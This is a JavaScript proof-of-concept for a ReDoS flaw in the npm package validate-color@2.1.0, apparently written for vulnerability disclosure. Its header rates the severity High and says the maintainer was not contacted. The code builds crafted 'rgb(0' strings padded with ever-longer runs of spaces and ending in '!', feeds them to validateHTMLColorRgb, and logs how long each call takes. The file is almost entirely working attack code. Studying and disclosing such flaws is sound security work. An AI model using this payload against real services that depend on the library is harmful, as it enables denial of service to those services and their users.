/**
 * validate-color@2.1.0
 * Package Manager: npm
 * Link to published package: https://github.com/dreamyguy/validate-color
 * Link to GitHub repo: https://github.com/dreamyguy/validate-color
 * Severity level: High
 * Module Description: Validate HTML colors by 'name', 'special name', 'hex', 'rgb', 'rgba', 'hsl', 'hsla', 'hwb' or 'lab' values
 * Additional Info: It allows cause a denial of service when handling crafted invalid rgb(a) strings.
 * Contacted maintainer?: No
 * Open issue?: No
 */


require("react/package.json"); // react is a peer dependency.

require("react-dom/package.json"); // react-dom is a peer dependency.
var validateColor = require("validate-color")

function build_blank(n) {
 var ret = "rgb(0"
 for (var i = 0; i < n; i++) {
  ret += " "
 }
 return ret + "!";
}

//validateColor.validateHTMLColorRgb('rgb(0 0 0)')

for(var i = 1; i <= 5000000; i++) {
   if (i % 100 == 0) {
        var time = Date.now();
        var attack_str = build_blank(i)
        validateColor.validateHTMLColorRgb(attack_str)
        var time_cost = Date.now() - time;
        console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
 }
}
